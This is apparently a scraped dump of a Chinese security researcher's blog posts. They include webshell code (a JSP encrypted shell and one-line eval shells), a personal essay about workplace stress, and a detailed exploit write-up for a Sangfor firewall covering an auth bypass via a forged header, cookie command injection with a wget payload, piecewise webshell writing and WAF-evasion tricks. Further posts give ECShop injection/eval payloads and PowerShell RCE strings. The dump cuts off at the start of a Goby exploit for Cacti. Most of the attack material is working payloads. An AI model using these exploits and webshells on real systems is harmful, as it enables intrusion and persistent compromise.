javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt; 1&lt;% out.println(&quot;hello&quot;);%&gt; 蚁剑ASPX1&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt; PHP1&lt;?php eval($_POST[&#x27;pass&#x27;]); ?&gt; JSP1&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;pass&quot;));%&gt; 漏洞模版PHPIP-guard WebServer view.php 远程命令执行漏洞 IP-guard WebServer view.php remote command execution vulnerability CVD-2023-3208 ASPXMicrosoft Exchange Server Remote Command Execution Vulnerability (CVE-2021-26857&#x2F;CVE-2021-26858) Microsoft Exchange Server 远程命令执行漏洞（CVE-2021-26857&#x2F;CVE-2021-26858） CVD-2023-0787 JSPI Doc View cmd.json remote command execution vulnerability I Doc View cmd.json 远程命令执行漏洞 CVD-2023-3273","categories":[{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"反弹 shell","slug":"反弹-shell","permalink":"https://gryffinbit.top/tags/%E5%8F%8D%E5%BC%B9-shell/"}],"author":"Gryffinbit"},{"title":"2023下半年工作心路历程","slug":"2023下半年工作心路历程","date":"2023-10-20T14:36:46.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/10/20/2023下半年工作心路历程/","permalink":"https://gryffinbit.top/2023/10/20/2023%E4%B8%8B%E5%8D%8A%E5%B9%B4%E5%B7%A5%E4%BD%9C%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/","excerpt":"","text":"近期情绪思考和接下来的解决方案控制情绪，尽量不要失控的发脾气真实感受近期的感受：特别辛苦，很不开心。完全失去了生活和思考的时间和空间，感觉生活里都是同事和工作，很窒息。节奏很快，压力很大。 工作人员变动也很大，都是流水的实习生，大家朝夕相处了很长一段时间，很快又面临分别。他们都是一群真挚、热情、善良的人。面临分离，我还是不会很好的处理自己的情绪。 之前吃饭的时候，随口闲聊别人问过我，为什么大学不在北京上，为什么之前不在北京工作，原因就是，我知道北京就是这样的，我不喜欢，所以任性的给了自己几年的时间去远离北京这样的城市。家在北京，还是要回，所以现在回来了，也做好了心里建设，但面对当前的工作强度和压力，还是比我预期的要差很多。 其实也清楚，退一步海阔天空，即使是在北京也一定存在更好的环境，更舒服的工作。可是，我焦虑35岁裁员危机、焦虑当前很差的就业环境，和安全这个很窄的行业。所以，我会很执拗的认为，我必须在还年轻没有太多生活负担的时候，逼迫自己变得很厉害，无论是技术上的提高，还是工作能力上的提高，我认为只有自己成为很强又不可代替的人的时候，我才会有我的那份安全感。所以在我看来，任何没有让我得到提高的工作都是温水煮青蛙的慢性自杀。 但情绪总需要一个突破口，我的情绪让我明白，现在的压力让我不开心了。我的理智让我明白，现在做的，是我所认可的工作。因此我算是亲手把自己装进了一个囚笼里，但我不想很轻易的被打倒。 不切实际但肯定有用的真实的想法：我觉得各种压力太大了，很需要休息，我特别想去山上修仙。去那种道观里面，喝喝茶，看看书，呼吸大自然的新鲜空气，没有人打扰，日出而作，日入而息，让灵魂得到净化。我还想去做自由职业，远程办公，游山玩水，在湖边码字，在山下吹风。 想做的事情很多，向往更高的远方，更美好的未来。可是生活总是更多的妥协，向下看看现实，脚下还有很多很多的路要继续往前走。 情绪源头及焦虑点情绪源头主要是三部分：KPI、客户问题解、工作量大 KPI：日常工作和KPI偏离较大当前面临的：做了很多漏洞优化和解决客户问题。漏洞录入少、发不够足够多的文章。 我所担忧的： 担心转正、担心同事和领导对我的认可度、担心年终奖 担心研究知识的时间长，但却交不出KPI需要的产出 具体实例：做某件事情的时候，我想要先把工作结果交出来，比如先把优化好的漏洞提交通过。这样我会觉得任务完成，时间充裕，没有压力了，我才能放心的去做研究。因为我会担心，我去学一个技术点的时候，其实很慢，而且交不出文章，交不出结果，我特别害怕被催。 如何解决： 重新制定 KPI 学习方向：之所以迷茫且担心菜，是因为最近做的东西都太杂太没方向性了。所以接下来我决定在漏洞方面上，更有方向性的锁定在PHP的漏洞上。以漏洞录入和优化为驱动，系统的在这方面展开学习和研究。 害怕无产出被催的问题：学习内容，我不再纠结于是否正式，是否能发文章。接下来我会倾向自己随手记点东西，发Blog，或者上传在漏洞团队，这样会让我觉得没有压力。关于文章发表，我会从随笔里找灵感，或者从热点漏洞中，记录有价值的发文章。 客户反馈：时间被碎片化当前面临的： 时间总被碎片化，总是被打扰 我的耐心有限 我所担忧的： 不想成为工具人，想在技术上有更高的突破，不想成为很容易被替代的“简单人”。 我希望我是因为我的工作能力强而来承担这个任务的，而不是因为其他的任何原因，我绝对不会让自己成为职场上“被欺负”的对象。 我知道我确实沟通能力强且逻辑更清晰，这是我的优点，我也很喜欢。但是这不是我想着重发展且以此为生的点。我感觉当下我的职业安排，偏离了我预想的轨道。 具体实例：其实我已经在解决某个客户反馈来的漏洞问题了，但是总有同事没完没了的问我，让我觉得我干的活儿都白干了，一直被质疑很不舒服。 如何解决 关于我做的工作是否有价值：我要重新定位我在公司的员工价值。因为我们毕竟不是一家研究院，况且我和绝大多数的人，都不是单纯产出技术的科学家。我们只是给公司盈利的打工人，而客户就是给钱的一方，解决客户问题给公司盈利这是我义不容辞的工作内容的一部分。我曾经倾向于认为只有录好漏洞、发好文章、挖好漏洞，这些纯技术层面的才是值得被肯定的，现在我要改变这个狭隘的想法。很好的解决客户问题、有效的和别的部门沟通、提升技术能力，这些是同等价值的。我应该认可自己在这三点中每一条的价值，不应有所偏袒。 工具人问题：作为正式的员工而非实习生，熟悉公司的业务，这是必然的。漏洞部门不是独立于公司的，所以必须需要一个稳定的接口，而我的价值，就是提供稳定的接口。 在长时间的解决某个客户问题的时候，我应该主动给别人更多的反馈，和别人跟进某个漏洞的进度。别人会不停的发问，确实也是因为别人不知道具体发生了什么，我有责任跟进到底。但是，请不要把我没接手，或是别人已经响应了的问题（我会默认责任人非我），指责到我的头上。虽然我认为漏洞部是一个整体，但我无法接受无故被骂，这是对我其他负责任事情的蔑视。 工作量大：负荷高，情绪问题加剧当前面临的：每天，从早上坐在这个椅子开始，就马不停蹄的一直工作，没有喘息的时间。无数的任务，鞭子一样的抽着我向前。工作负荷大，造成了情绪很差。厌班情绪严重、自闭、没耐心、暴躁。 我所担心的： 我只是想按时下班，因为我整个工作时间，是非常高效的，不摸鱼不偷懒，在工作时间内，我已经很尽力的工作了，特别累，没有极特殊的情况，真的不想加班了。 我担心我的按时下班，会招来领导的不满。影响我的各种考核。但是我真的不认为，不加班就是干活少了。 我想努力平衡工作和生活，能保持一点我的私人生活时间，做些其他我喜欢的事情。所以我想知道，下班时间、假期时间，不”学习“，不额外工作，是否就是应该”心怀愧疚的“，是否就是不被允许的，会影响考核和个人评价的。 如何解决： 这是个综合的普遍问题，当前理想状态是解决情绪源头1、2，或许能改善情绪。 更多的分离工作和生活。下班便把工作情绪切断，把烦恼切断。在生活时间里，更好的休息，给自己充电。 将工作任务，整理成清单，以减缓压力和焦虑感。","categories":[{"name":"脆弱的本体","slug":"脆弱的本体","permalink":"https://gryffinbit.top/categories/%E8%84%86%E5%BC%B1%E7%9A%84%E6%9C%AC%E4%BD%93/"}],"tags":[{"name":"感想","slug":"感想","permalink":"https://gryffinbit.top/tags/%E6%84%9F%E6%83%B3/"}],"author":"Gryffinbit"},{"title":"深信服下一代防火墙文件读取、远程命令执行漏洞分析","slug":"深信服下一代防火墙文件读取、远程命令执行漏洞分析","date":"2023-10-20T14:22:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/深信服下一代防火墙文件读取、远程命令执行漏洞分析/","permalink":"https://gryffinbit.top/2023/10/20/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"深信服下一代防火墙文件读取、远程命令执行漏洞分析近期，深信服下一代防火墙出了一个文件读取、远程命令执行漏洞，目前已公开的漏洞利用技术仅能做到简单的命令执行，无法满足实际攻防场景。本次漏洞利用，我们通过对安全防护设备的绕过，完整的实现了 PHP 代码执行和漏洞回显。 漏洞分析该章节将从源代码的角度，深入分析以下三个漏洞点。 身份绕过分析 apache 的配置文件通过分析 /etc/apache/conf.new/original/httpd.conf 、/etc/apache/conf.new/httpd.conf 等 apache 配置文件，我们可以找到 sangfor 下一代防火墙的配置文件和敏感文件的具体路径。 1234567ScriptAlias /cgi-bin/ &quot;/virus/apache/apache/cgi-bin/&quot;Alias /cgi-bin/ &quot;/virus/webui/cgi-bin/&quot;Alias /svpn_html/ &quot;/virus/webui/svpn_html/&quot;Alias /bbc &quot;/virus/webui/ext/fast_deploy.html&quot;Alias &quot;/html&quot; &quot;/virus/webui/html&quot;Alias /proxy.html &quot;/virus/webui/ext/login.php&quot;Alias /proxy_cssp.html &quot;/virus/webui/ext/login.php&quot; 其中 /virus/webui/svpn_html/ 路径很重要，在后面的利用中，我们可以将文件写入该路径，并且通过外部来进行访问。 访问敏感路径会被重定向虽然找到了敏感的路径，但是直接访问之后都会被重定向到LogInOut.php ，被迫进行身份验证。 继续查看 apche 的配置文件，我们发现了 RewriteRule 这个规则限制，以及对控制器的调用。 该规则会进行判断，将所有非特定扩展名的请求重写到 index.php 文件，从而将 URL 解析交给 index.php 来处理。 1234567AllowOverride None: 该指令允许覆盖配置文件的设置。在这里，设置为 None 表示不允许使用.htaccess文件来覆盖配置文件中的设置。RewriteEngine on: 开启URL重写功能。RewriteCond %&#123;REQUEST_METHOD&#125; ^(TRACE|TRACK): 该条件判断如果请求的方法是 TRACE 或 TRACK，则执行下面的 Rewrite 规则。RewriteRule .* - [F]: 如果符合上述条件，将返回一个 Forbidden 错误（403）。RewriteBase /: 设置 URL 重写的基本路径为根路径。RewriteRule !.(js|gif|jpg|jpeg|png|css|pdf|ico|htm|html|htc|zip|crt|txt)$ index.php: 如果请求的文件不是 js、gif、jpg、jpeg、png、css、pdf、ico、htm、html、htc、zip、crt、txt 的扩展名之一，则将请求重写到 index.php 文件。RewriteRule .(php)$ index.php: 如果请求的文件是以 .php 结尾的，则将请求重写到 index.php 文件。 1234require_once(CLASS_COMMON_PATH.&quot;dispatch/CFrontController.php&quot;);$t_objFrontController = new CFrontController();$t_objFrontController-&gt;dispatchRequest(); 此控制器类用于处理应用程序级路由。这一切都映射在 CFrontController.php ，我们可以看到端点以及与每个端点关联的相应控制器函数。如果不首先进行身份验证，则无法通过 web 页面直接访问到那些敏感路径. 利用dispatchRequest() 函数绕过重定向通过查看 dispatchRequest() 函数，我们发现，它会去调用各种控制器函数。 12if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] === &#x27;127.0.0.1&#x27;) $t_boolNeedCheck = false; 其中该行的 IF 条件，会进行判断。如果值为 127.0.0.1 的的话，会将 boolNeedCheck 值设为 false ，进而不再进行其他的重定向逻辑判断。 由此可见，我们可以利用修改 HTTP 请求标头的方式，来绕过逻辑判断。 通过查看 apache 的配置文件，我们找到了以下配置信息。 RPAFheader 是一个 Apache 模块，用于在代理服务器后面识别客户端的真实 IP 地址。通过配置 RPAFheader 模块，可以让 Apache 在处理请求时使用代理服务器发送的请求报头中的特定字段作为客户端的IP地址，而不是默认使用代理服务器的IP地址。 结合刚刚提到的 IF 判断条件，以及修改特定标头来控制 PHP 看到的 IP 地址的方式。我们分析出，可以将请求头设置为 Y-Forwarded-For: 127.0.0.1。这样便可以绕过身份验证机制了。 文件读取分析 loadfile.php查看 /svpn_html/loadfile.php 分析文件读取的过程。 123$file = addslashes($_GET[&#x27;file&#x27;]); ：从 GET 请求中获取名为 `file` 的参数，并对其进行转义。echo $file; ： 将文件名输出到页面。readfile($file); ： 将文件内容输出到响应体，实现文件的下载。 之前查看 apache 配置文件，我们得到了 sangfor 下一代防火墙的真实路径和访问路径。通过分析 loadfile.php，我们得到了文件读取的访问参数。最后再添加上身份验证绕过的请求头。最终实现了文件读取的效果。 获取 PHPSESSID可以获取到一些实时显示的文件，劫持会话 PHPSESSID 12345/etc/sinfor/DcUserCookie.conf/etc/en/sinfor/DcUserCookie.conf/config/etc/sinfor/DcUserCookie.conf/config/etc/en/sinfor/DcUserCookie.conf/virus/apache/apache/logs/access_log 命令执行寻找命令执行注入点将 pspy 二进制文件与 grep 命令一起放在目标框中，可以查看 Apache 进程生成的内容： 在进行身份验证时，发现用户名被直接传递到 shell 命令中。 通过浏览 CFWLogInOutDAO.php ，发现了漏洞点的存在。代码中使用了 addslashes() 来转义，但在使用 popen() 函数时却没有进行任何过滤处理。 1234567891011121314151617public function remoteLogin(&amp;$in_arrSearchCondition) &#123; $userName = $in_arrSearchCondition [&#x27;user_name&#x27;]; $passwd = $in_arrSearchCondition [&#x27;password&#x27;]; //rsa的解密 $t_strMD5 = $this-&gt;decrypt($passwd); $fp = popen(&quot;/usr/sbin/remoteLogin remoteLogin $userName $t_strMD5&quot;, &quot;r&quot;); $retResult = fread($fp, 20); pclose($fp); if ($retResult == &quot;retLoginSuccess&quot;) &#123; $in_arrSearchCondition [&#x27;user_name&#x27;] = $userName.&quot;_remote_&quot;; $t_strUserName = addslashes($in_arrSearchCondition [&#x27;user_name&#x27;]); $t_strSQL = &quot;SELECT * FROM FW_AUTH_dcuser.UserAuthInfo WHERE user_name = &#x27;$t_strUserName&#x27; AND status = 1 LIMIT 1&quot;; return $this-&gt;setSession($t_strSQL); &#125; return false; &#125; 最终我们得到了命令执行的效果，但因为取值自 cookie，因此无法用注入分号来截断命令，也无法进行URL 编码。但可以使用反引号来达成命令执行的效果。 1234567POST /cgi-bin/login.cgi HTTP/1.1Host: Cookie: PHPSESSID=`$(wget host)`;Content-Type: Application/X-www-FormConnection: close &#123;&quot;opr&quot;:&quot;login&quot;, &quot;data&quot;:&#123;&quot;user&quot;: &quot;watchTowr&quot; , &quot;pwd&quot;: &quot;watchTowr&quot; , &quot;vericode&quot;: &quot;EINW&quot; , &quot;privacy_enable&quot;: &quot;0&quot;&#125;&#125; 深入利用 RCE上一章节介绍到的方式，命令执行无回显，且通过 wget 下载文件的方式，限制很多。于是本章将详细介绍如何巧妙利用漏洞点，在命令执行受限且不出网的情况下，实现成功执行复杂代码的效果。 写入一句话木马可以访问到的web路径： 1/fwlib/sys/virus/webui/svpn_html payload 传入命令部分遇到的限制由于执行命令的路径，是在PHPSESSID，取值自cookie。所以面临一些限制。 无法注入分号截断命令 无法使用 || &amp;&amp; 等特殊符号 想要通过echo写入文件时，&gt;&gt; 追加写入的方式，不可以，&gt; 会被截断 较长的 PHP 代码部分，都无法被传入，无法正常解析，需要分段截取写入 传入命令时，需要对特殊字符进行 url 编码 由于无法用追加的方式写入到一个 php 文件内，所以将 php 的代码截断，分别写入到不同的 txt 内，最后再将这些文件的内容读取，写到 php 文件内。先写入一个小马，之后在这个小马的基础上，实现更复杂的功能。 123&lt;?php eval($_POST[&quot;pass&quot;])?&gt; 1234567891011echo -e -n \\&quot;&lt;?php\\\\n\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/1.txtecho -e -n \\&quot;eval\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/2.txtecho -e -n &#x27;($_POST[\\&quot;pass&#x27; &gt; /fwlib/sys/virus/webui/svpn_html/3.txtecho -e -n &#x27;\\&quot;])&#x27; &gt; /fwlib/sys/virus/webui/svpn_html/4.txtecho -e -n \\&quot;\\\\n?&gt;\\\\n\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/5.txtcat /fwlib/sys/virus/webui/svpn_html/1.txt /fwlib/sys/virus/webui/svpn_html/2.txt /fwlib/sys/virus/webui/svpn_html/3.txt /fwlib/sys/virus/webui/svpn_html/4.txt /fwlib/sys/virus/webui/svpn_html/5.txt&gt; /fwlib/sys/virus/webui/svpn_html/xxx.php 通过这种方式写入的时候，也遇到一个问题，虽然单独写入 txt 文件时，txt 的文件名可以随意选取。但是若通过 cat&gt;php 的方式写入。需要 txt 文件名，只有 1 位，写入的 php 文件名，3 位以下。 执行命令并回显执行系统命令，并获得回显。 1echo system(&quot;id&quot;) 但是，以这样的方式进行系统命令的执行，会有很多的限制，当执行类似echo &quot;hello&quot; &gt; 1.php 这样的长命令时，会对一些特殊字符进行过滤拦截。所以只能通过这种方式执行短命令。 防护绕过上一小节提到的代码执行过程中，会对特殊字符进行过滤，所以我们需要对 php 代码进行编码。但是编码的时候，会遇到的问题是，当执行一些特殊的 php 函数，以及外部连接的流量有恶意特征时，则会被安全防护设备检测到并拦截。因此，本小节将详细介绍如何绕过安全防护措施，并成功执行复杂的 PHP 代码。 base64 编码当命令明文传输时，会被限制，所以想到可以对输入的命令进行 base64 编码来简单绕过。但是直接用 php 代码的 base64 函数，会被防御机制拦截，无法顺利发包。 所以想到用另外的写法，绕过防御机制 1echo system($_POST[1](&quot;cHdk&quot;));&amp;1=base64_decode php 代码执行过程中，遇到的坑 当 base64 中存在 + 号，发包后会存在解析有误的问题，所以对 base64 整体这一部分，还需要对特殊字符进行额外的 url 编码 1url.QueryEscape(base64Encode(cmd)) 当发送的命令太短（小于三位），导致 base64 长度很短时，也会面临失败的问题。这时可以利用命令的替换来绕过。 12ls echo ls | sh WAF 设置了一些策略，对= 有限制，比如 base64 之后，结尾处有等号，一个或者两个，就会导致发包失败，但是可以在等号的后面添加空格，进行绕过。base64 后添加空格并不会影响结果。（可能 waf 为了防止赋值设置的规则，赋值字符串就会用到 $a=&quot;b&quot; ） 通过利用 http 头来进行传参。限制是对长度有限制，http 头长度超过 3000 时会失败 1echo system($_POST[1]($_SERVER[&quot;HTTP_CMD&quot;]));&amp;1=base64_decode $_SERVER[&quot;HTTP_CMD&quot;] 是获取 http 请求头的数据。 嵌套多层 $_POST 既然直接传入有限制，那就通过改变写法的方式绕过，自行传参进去。 1echo system($_POST[1]($_POST[2]));&amp;1=base64_decode&amp;2=bHMgLw== 利用 hex2bin 和 base64 一个思路，就是通过编码来绕过它的防护机制。它有一定的版本限制。（sangfor 的这个产品不支持，它的版本在5.3.2） 12echo system(hex2bin($_POST[&quot;command&quot;])); // 普通写法echo system($_POST[1](&quot;command&quot;));&amp;1=hex2bin // 绕过写法 绕过恶意流量的检测当能执行 php 代码的时候，可能会想到用 webshell 管理工具进行连接。这个过程中遇到了两个问题。 webshell 管理工具的马是可以正常写入并且在网站内通过 get 的方式能正常访问，但是在 webshell 管理工具连接的时候，就会出错。所以就想到了，可能是被防护设备拦截了。于是就需要改变马的特征，绕过防护设备。 在此次攻击的绕过，需要修改 webshell 木马的默认连接密码、密钥 key、默认请求头 关于webshell管理工具的流量特征，可以参考以前的文章： 哥斯拉v4.0流量解密及特征流量提取 - Gryffinbit 冰蝎4.0特征分析及流量检测思路 - Gryffinbit 连接的过程中，实际上 webshell 工具也要发包过去，所以，根据此次漏洞的漏洞点，还需要修改管理工具的请求头，要加上一行 1Y-Forwarded-For: 127.0.0.1 另外，在传 webshell 马上去的时候，因为要额外控制更多的参数、传入的内容，传入的名称。所以需要更多的变量。在这里也发现了一个有意思的坑点： 执行的函数更复杂，所以需要更多的传参点 1234file_put_contents($_POST[filename],base64_decode($_POST[content])); // 正向写法pass= $_POST[1]($_POST[2],$_POST[3]($_POST[4]));&amp;1=file_put_contents&amp;2=filename.php&amp;3=base64_decode&amp;4=PD9waHAKQHNlc3Npb25fc3RhcnQoKTsKQHNldF90aW1lX2xpbWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBlbmNvZGUoJEQsJEspewogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7CiAgICAgICAgJGMgPSAkS1skaSsxJjE1XTsKICAgICAgICAkRFskaV0gPSGF5bG9hZCk7CiAgICAgICAgZWNoAgIGVjaG8gc3Vic3RyKG1kNSgkcGFzcy4ka2V5KSwxNik7CiAgICB9ZWxzZXsKICAgICAgICBpZiAoc3RycG9zKCRkYXRhLCJnZXRCYXNpY3NJbmZvIikhPT1mYWxzZSl7CiAgICAgICAgICAgICRfU0VTU0lPTlskcGF5bG9hZE5hbWVdPWVuY29kZSgkZGF0YSwka2V5KTsKICAgICAgICB9CiAgICB9Cn0K// 绕过写法 必须要在木马传参点 pass= 的后面加一个空格进行传参。 总结通过深入研究深信服下一代防火墙的漏洞，我们摸清了该产品更多的细节，研究出了利用范围更广的攻击方式。 希望在阅读本篇文章后，能为大家带来一些新思路的启发。 参考命令执行绕过WAF总结，RCE常见的Bypass思路 - FreeBuf网络安全行业门户 Yet More Unauth Remote Command Execution Vulns in Firewalls - Sangfor Edition — 防火墙中还有更多非身份验证远程命令执行漏洞 - Sangfor 版 (watchtowr.com)","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"深信服","slug":"深信服","permalink":"https://gryffinbit.top/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"}],"author":"Gryffinbit"},{"title":"写PHP站的exp时遇到的问题总结","slug":"写PHP站的exp时遇到的问题总结","date":"2023-10-20T11:43:41.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/写PHP站的exp时遇到的问题总结/","permalink":"https://gryffinbit.top/2023/10/20/%E5%86%99PHP%E7%AB%99%E7%9A%84exp%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"","text":"小马传大马的思想 鸿宇多用户商城 user.php 任意命令执行漏洞 通过命令执行的点，传入 PHP代码。 写入 PHP 代码到文件中，可以先写成 txt 的文件格式，查看写入的内容是否被拦截，是否被解析了。 当前的状态是可以命令执行，在命令执行的部分，直接echo 的方式，进行php 马的写入，可能会失败。这时候，可以先写入txt看看，写入的php函数是否被解析了。 我今天遇到的是，传入的部分，被&quot; 解析了，poc 的部分是这样的，是利用了 user.php 的参数进行传入。然后造成了命令执行。但是user.php，会对传入的数据进行解析。所以，直接在这里传马的话，会被解析处理掉。并且，如果函数里的参数是字符串的形式，比如，$_POST[“string”]，它就会被解析掉，不能顺利写入。所以用数字. 所以就想到了，既然能命令执行，那可以写入文件，写一个php的文件，然后再通过这个文件，进行文件上传。先写一个小马，通过小马传大马。写小马的时候，要用绕过的方式来写。不要正向的去写。 1`echo &quot;&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt;)&quot; &gt; hello.php`&#125;;&amp;1=$_POST[1]&amp;2=$_POST[2] POST 里面的参数，用的是数字，是为了避免写进去的时候被解析掉。file_put_contents 的方式，将内容写入。第一个参数是用来接收传入的文件名的，第二个接收传入的PHP代码。 成功上马 windows环境，cmd 不好用的时候，把 powershell 搞出来普通命令执行的时候是这样 1action=login&amp;pp123=$&#123;`cmd`&#125;; 牛逼并且有回显的命令执行是这样 1action=login&amp;pp123=$&#123;@var_dump(print%20`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe%20cmd`)&#125;; 如果能执行php，优先php内置执行命令。 1echo(system(&quot;dir&quot;)); PHP 反序列化漏洞1554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&quot; 解码后 1554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,-1&#x27; UNION/*,2,4,5,6,7,8,&#123;$asd&#x27;];eval (base64_decode (&#x27;eval(base64_decode($_POST[rick]));&#x27;));//&#125;xxx,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&quot; 其中，前后的部分是md5，解密之后是ecshop 1ecshopads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,-1&#x27; UNION/*,2,4,5,6,7,8,&#123;$asd&#x27;];eval (base64_decode (&#x27;eval(base64_decode($_POST[rick]));&#x27;));//&#125;xxx,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;ecshop&quot; 所以漏洞传参点，在rick那里，post传入。 eval函数来可以传参来进行php的代码执行。 利用这个代码执行的点，来执行命令 传入参数，执行cmd命令 1echo(system(\\&quot;&quot;+cmd+&quot;\\&quot;)); 进行马的上传 可以利用php的file_put 函数来进行文件的写入。 1&quot;action=login&amp;rick=&quot; + base64EncodeWaTqS(&quot;file_put_contents(&#x27;&quot;+filename+&quot;&#x27;,&#x27; &quot;+content+&quot;&#x27;);&quot;) content 的内容是php马的内容，filename是马的文件名。 附录php中，双引号里面是可以解析变量的，但是单引号里面不解析变量。 想要把以下的内容，通过 php 代码写入到文件中，并且POST 是变量，需要传参数进去。 1&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt; 1file_put_contents(&quot;hello.txt&quot;,&#x27;&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt;&#x27;); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413package exploitsimport ( &quot;encoding/base64&quot; &quot;errors&quot; &quot;git.gobies.org/goby/goscanner/godclient&quot; &quot;git.gobies.org/goby/goscanner/goutils&quot; &quot;git.gobies.org/goby/goscanner/jsonvul&quot; &quot;git.gobies.org/goby/goscanner/scanconfig&quot; &quot;git.gobies.org/goby/httpclient&quot; &quot;net/url&quot; &quot;strings&quot; &quot;time&quot;)func init() &#123; expJson := `&#123; &quot;Name&quot;: &quot;Cacti monitoring system remote_agent.php command execution vulnerability (CVE-2022-46169)&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti is an open source platform that provides users with a powerful and scalable operational monitoring and fault management framework.&lt;/p&gt;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter 